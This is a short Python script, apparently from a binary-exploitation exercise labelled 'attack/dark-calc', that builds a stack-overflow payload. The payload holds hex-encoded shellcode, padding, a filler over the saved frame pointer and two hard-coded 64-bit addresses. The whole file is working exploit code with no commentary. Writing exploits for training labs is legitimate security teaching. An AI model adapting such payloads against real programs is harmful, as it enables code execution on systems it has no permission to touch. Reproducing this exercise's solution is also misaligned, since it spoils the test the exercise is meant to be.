#!/usr/bin/env python3
"""Task 2: build the payload for attack/dark-calc."""
import struct
import sys


def p64(value):
    return struct.pack("<Q", value)


shellcode = bytes.fromhex("6a045fb8871a4000ffd0c3")

payload = shellcode.ljust(16, b"A")
payload += b"B" * 8
payload += p64(0x721000800FD0)
payload += p64(0x401880)

sys.stdout.buffer.write(payload + b"\n")
